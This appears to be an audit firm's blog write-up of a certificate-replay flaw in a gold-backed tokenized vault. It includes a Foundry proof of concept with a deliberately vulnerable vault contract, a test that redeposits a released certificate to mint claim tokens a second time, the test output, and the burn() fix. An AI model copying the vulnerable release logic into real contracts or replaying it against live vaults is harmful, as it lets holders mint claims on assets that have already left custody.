# 🕵🏽 QuillAudits Finds Certificate Replay Bug in Gold-Backed Vault

- **Source URL:** https://www.quillaudits.com/blog/auditing/eligibility-replay-tokenized-assets
- **Fetched:** 2026-11-14
- **Channel:** @defendor_eng
- **Telegram message:** https://t.me/defendor_eng/2105 (id 2105)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Learn how release skipped burn() and handed the certificate back, that leftover NFT minted a second claim on gold that had already left the vault.

QuillAudits Team

This is one of the vulnerability our auditors had found during a client engagement. We're sharing it here, because walking through a real bug is one of the best ways to learn what to watch for when you're building or reviewing something similar. This is the first in a series where we'll be doing that with some of the more interesting things we catch during audits.

The protocol in this case is a gold-backed vault. Customers send in physical gold bars, and in return, the protocol gives them a claim token that represents that gold on-chain. Behind the scenes, each bar is tracked with an NFT, called a certificate, that proves the vault is holding that specific bar. We found a way for a customer to take their real gold out of the vault, and then trick the system into minting them a second batch of claim tokens for gold that had already left.

Every physical gold bar is represented by one certificate NFT. When a new bar arrives, the protocol's certifier verifies it, and the vault mints a fresh certificate. That certificate stays with the vault, not the customer, as proof the bar is inside, and the vault mints a claim token against it, the customer's on-chain claim to that gold. A customer can also hand in a certificate they already hold to mint more claim tokens against it, as long as the vault is actually holding the matching bar.

When a customer wants their gold back, they burn their claim tokens and the vault releases the bar. At that point the certificate is supposed to be worthless. Its only job was proving the vault held that specific bar, and once the bar is out, that's no longer true.

The vault doesn't destroy the certificate on release. It just hands it straight back to the customer, still perfectly valid.

So the customer walks away holding two things: the gold bar, and a certificate that still tells the vault this bar is safely inside. Nothing stops them from walking back in, handing that certificate over again, and minting a fresh batch of claim tokens for gold that's already gone.

The fix already existed in the code. `CertificatesNFT.burn` destroys a certificate. It can only be called by the vault, and only while the vault holds the certificate, exactly the situation at the moment gold gets released. Nobody called it.

Here's the function, the one a customer calls once they've burned their claim tokens and are ready to walk out with their gold:

```
1certificatePositions[id] =
2    VaultTypes.CertificatePosition({state: VaultTypes.CertificateState.OutsideVault, activeRequestId: 0});
3nft.transferFrom(me, recipient, id);
4
```
The position flips to `OutsideVault`, and the certificate goes straight back into the customer's wallet. Nothing marks it as used.

Getting a genuinely new certificate is hard on purpose: it needs sign-off from the protocol's certifier, plus a one-time custody reference proving a specific bar arrived. Handing an old certificate back in needs none of that. The vault just checks the certificate says outside the vault and takes its word for it.

It gets worse. Certificates are never destroyed, so a bar's serial number stays permanently marked as used. If that same bar genuinely comes back through the front door, the vault can't issue it a clean new certificate, that path is blocked, the serial number is already taken. Reusing the old certificate becomes the only way back in, for a legitimate return or a fraudulent one. What should be a rare, risky shortcut ends up as the default path, since nothing else works anymore.

We built a small working version of the same mechanics to confirm this isn't theoretical. It isn't the original's code, real vaults carry more logic than this, but it reproduces the exact behavior that matters.

Set up a fresh Foundry project:

```
1mkdir gold-poc && cd gold-poc
2forge init --no-git .
3forge install OpenZeppelin/openzeppelin-contracts --no-git
4
```
`remappings.txt`:

```
1@openzeppelin/=lib/openzeppelin-contracts/
2forge-std/=lib/forge-std/src/
3
```
`src/VaultTypes.sol`:

```
1// SPDX-License-Identifier: MIT
2pragma solidity ^0.8.24;
3
4/// @notice Minimal illustrative reproduction of the position-tracking types
5/// referenced in the finding. Not the audited source.
6library VaultTypes {
7    enum CertificateState {
8        None,
9        Vaulted,
10        OutsideVault
11    }
12
13    struct CertificatePosition {
14        CertificateState state;
15        uint256 activeRequestId;
16    }
17}
18
```
`src/CertificatesNFT.sol`:

```
1// SPDX-License-Identifier: MIT
2pragma solidity ^0.8.24;
3
4import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
5
6/// @notice Minimal illustrative reproduction. Represents a custody certificate
7/// for one physical gold bar held in the vault. Not the audited source.
8contract CertificatesNFT is ERC721 {
9    address public immutable vault;
10
11    modifier onlyVault() {
12        require(msg.sender == vault, "CertificatesNFT: not vault");
13        _;
14    }
15
16    constructor(address _vault) ERC721("Gold Custody Certificate", "CERT") {
17        vault = _vault;
18    }
19
20    function mint(address to, uint256 id) external onlyVault {
21        _mint(to, id);
22    }
23
24    /// @dev Only the vault can burn, and only while the vault itself holds
25    /// the certificate. This is exactly the situation at the moment physical
26    /// gold is released, which is the call site this finding is about.
27    function burn(uint256 id) external onlyVault {
28        require(ownerOf(id) == vault, "CertificatesNFT: vault must hold certificate");
29        _burn(id);
30    }
31}
32
```
`src/ClaimToken.sol`:

```
1// SPDX-License-Identifier: MIT
2pragma solidity ^0.8.24;
3
4import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
5
6/// @notice Minimal illustrative reproduction of the tokenized-gold claim
7/// token. Not the audited source, and not the real token name.
8contract ClaimToken is ERC20 {
9    address public immutable vault;
10
11    modifier onlyVault() {
12        require(msg.sender == vault, "ClaimToken: not vault");
13        _;
14    }
15
16    constructor(address _vault) ERC20("Vault Gold Claim", "CLAIM") {
17        vault = _vault;
18    }
19
20    function mint(address to, uint256 amount) external onlyVault {
21        _mint(to, amount);
22    }
23
24    function burnFrom(address from, uint256 amount) external onlyVault {
25        _burn(from, amount);
26    }
27}
28
```
`src/GoldVaultVulnerable.sol`:

```
1// SPDX-License-Identifier: MIT
2pragma solidity ^0.8.24;
3
4import {CertificatesNFT} from "./CertificatesNFT.sol";
5import {ClaimToken} from "./ClaimToken.sol";
6import {VaultTypes} from "./VaultTypes.sol";
7
8/// @notice Minimal illustrative reproduction of the vault's certificate
9/// lifecycle, including the vulnerable release path described in the
10/// finding. Not the audited source, trimmed to the mechanics that matter.
11contract GoldVaultVulnerable {
12    CertificatesNFT public immutable certNFT;
13    ClaimToken public immutable claimToken;
14    address public immutable certifier;
15
16    uint256 public constant CLAIM_PER_BAR = 1_000e18;
17
18    mapping(uint256 => VaultTypes.CertificatePosition) public certificatePositions;
19    mapping(bytes32 => bool) public usedCustodyRefs;
20    mapping(uint256 => bool) public serialRegistered;
21
22    modifier onlyCertifier() {
23        require(msg.sender == certifier, "GoldVault: not certifier");
24        _;
25    }
26
27    constructor(address _certifier) {
28        certifier = _certifier;
29        certNFT = new CertificatesNFT(address(this));
30        claimToken = new ClaimToken(address(this));
31    }
32
33    /// @notice Bar arrival. Strongly validated: certifier-gated, and the
34    /// custody reference proving the bar arrived can only be used once.
35    function registerNewBar(address to, uint256 certId, uint256 serial, bytes32 custodyRef)
36        external
37        onlyCertifier
38    {
39        require(!serialRegistered[serial], "GoldVault: serial already registered");
40        require(!usedCustodyRefs[custodyRef], "GoldVault: custody ref already used");
41        usedCustodyRefs[custodyRef] = true;
42        serialRegistered[serial] = true;
43
44        certNFT.mint(address(this), certId); // certificate stays with the vault while the bar is inside
45        certificatePositions[certId] =
46            VaultTypes.CertificatePosition({state: VaultTypes.CertificateState.Vaulted, activeRequestId: 0});
47        claimToken.mint(to, CLAIM_PER_BAR);
48    }
49
50    /// @notice Re-presenting an existing certificate. No certifier check and
51    /// no custody reference, open to anyone holding a certificate that is
52    /// currently marked OutsideVault.
53    function depositCertificate(uint256 certId) external {
54        require(
55            certificatePositions[certId].state == VaultTypes.CertificateState.OutsideVault,
56            "GoldVault: certificate not outside vault"
57        );
58        certNFT.transferFrom(msg.sender, address(this), certId);
59        certificatePositions[certId] =
60            VaultTypes.CertificatePosition({state: VaultTypes.CertificateState.Vaulted, activeRequestId: 0});
61        claimToken.mint(msg.sender, CLAIM_PER_BAR);
62    }
63
64    /// @notice Physical release. This is the call site the finding is about.
65    function release(uint256 certId, address recipient) external {
66        require(
67            certificatePositions[certId].state == VaultTypes.CertificateState.Vaulted,
68            "GoldVault: certificate not vaulted"
69        );
70        claimToken.burnFrom(msg.sender, CLAIM_PER_BAR);
71
72        // --- vulnerable: hands a fully valid certificate back instead of retiring it ---
73        certificatePositions[certId] =
74            VaultTypes.CertificatePosition({state: VaultTypes.CertificateState.OutsideVault, activeRequestId: 0});
75        certNFT.transferFrom(address(this), recipient, certId);
76    }
77}
78
```
`test/GoldSoldTwice.t.sol`:

```
1// SPDX-License-Identifier: MIT
2pragma solidity ^0.8.24;
3
4import {Test, console2} from "forge-std/Test.sol";
5import {GoldVaultVulnerable} from "../src/GoldVaultVulnerable.sol";
6import {VaultTypes} from "../src/VaultTypes.sol";
7import {CertificatesNFT} from "../src/CertificatesNFT.sol";
8
9contract GoldSoldTwiceTest is Test {
10    address certifier = makeAddr("certifier");
11    address customer = makeAddr("customer");
12
13    uint256 constant CERT_ID = 1;
14    uint256 constant SERIAL = 42;
15    bytes32 constant CUSTODY_REF = keccak256("bar-42-arrival");
16
17    function test_ReleasedCertificateCanBeRedepositedForFreshClaim() public {
18        GoldVaultVulnerable vault = new GoldVaultVulnerable(certifier);
19
20        // One physical bar arrives and is registered. This is the strongly
21        // validated path: certifier-gated, one-time custody reference.
22        vm.prank(certifier);
23        vault.registerNewBar(customer, CERT_ID, SERIAL, CUSTODY_REF);
24        console2.log(
25            "bar registered, one time only  | claim balance:",
26            vault.claimToken().balanceOf(customer) / 1e18
27        );
28
29        assertEq(
30            vault.claimToken().balanceOf(customer),
31            vault.CLAIM_PER_BAR(),
32            "customer should hold 1 bar of claim tokens"
33        );
34
35        // Customer redeems: burns claim tokens, takes the physical gold out.
36        vm.startPrank(customer);
37        vault.release(CERT_ID, customer);
38        vm.stopPrank();
39        console2.log(
40            "gold released to customer      | claim balance:",
41            vault.claimToken().balanceOf(customer) / 1e18
42        );
43
44        assertEq(
45            vault.claimToken().balanceOf(customer),
46            0,
47            "claim tokens were burned on release"
48        );
49        assertEq(
50            vault.certNFT().ownerOf(CERT_ID),
51            customer,
52            "certificate came back to the customer intact"
53        );
54        (VaultTypes.CertificateState state, ) = vault.certificatePositions(
55            CERT_ID
56        );
57        assertEq(
58            uint8(state),
59            uint8(VaultTypes.CertificateState.OutsideVault),
60            "certificate still marked valid"
61        );
62
63        // The gold has left the building. The certificate for it has not
64        // been touched. Hand it straight back in.
65        vm.startPrank(customer);
66        vault.certNFT().approve(address(vault), CERT_ID);
67        vault.depositCertificate(CERT_ID);
68        vm.stopPrank();
69        console2.log(
70            "same certificate redeposited    | claim balance:",
71            vault.claimToken().balanceOf(customer) / 1e18
72        );
73
74        // Fresh claim tokens, minted against a bar that is no longer in the vault.
75        assertEq(
76            vault.claimToken().balanceOf(customer),
77            vault.CLAIM_PER_BAR(),
78            "customer minted a second bar of claim tokens against the same, already-withdrawn gold"
79        );
80    }
81}
82
```
Run it:

```
1forge test --match-contract GoldSoldTwiceTest -vv
2
```
Output:

```
1
2Ran 1 test for test/GoldSoldTwice.t.sol:GoldSoldTwiceTest
3[PASS] test_ReleasedCertificateCanBeRedepositedForFreshClaim() (gas: 3884735)
4Logs:
5  bar registered, one time only  | claim balance: 1000
6  gold released to customer      | claim balance: 0
7  same certificate redeposited    | claim balance: 1000
8
9Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.03ms (1.81ms CPU time)
10
11Ran 1 test suite in 156.98ms (6.03ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
12
```
Look at the claim token balance across those log lines. It goes up to 1,000 when the bar is registered, drops to 0 on release, then climbs back to 1,000, just from handing the same certificate back in. One bar of gold. Two batches of claim tokens.

```
1  certificatePositions[id] =
2-     VaultTypes.CertificatePosition({state: VaultTypes.CertificateState.OutsideVault, activeRequestId: 0});
3-     nft.transferFrom(me, recipient, id);
4+     VaultTypes.CertificatePosition({state: VaultTypes.CertificateState.None, activeRequestId: 0});
5+     nft.burn(id);
6
```
That's the entire fix. Burn the certificate instead of returning it. No new checks, no new state, both already existed. The only missing piece was calling `burn`.

```
1// src/GoldVaultFixed.sol, patched release()
2function release(uint256 certId, address recipient) external {
3    require(
4        certificatePositions[certId].state == VaultTypes.CertificateState.Vaulted,
5        "GoldVault: certificate not vaulted"
6    );
7    claimToken.burnFrom(msg.sender, CLAIM_PER_BAR);
8
9    certificatePositions[certId] =
10        VaultTypes.CertificatePosition({state: VaultTypes.CertificateState.None, activeRequestId: 0});
11    certNFT.burn(certId);
12}
13
```
This bug wasn't flashy, one function handed back something it should have destroyed, and the fix was already sitting in the code, unused. Most real bugs are like that, a small gap between what a system assumes and what's actually still true.

Contents

Tell Us About Your Project

Subscribe to Newsletter

Loading...

From day-zero risk mapping to exchange-ready audits, QuillAudits helps projects grow with confidence. Smart contracts, dApps, infrastructure, compliance: secured end to end.
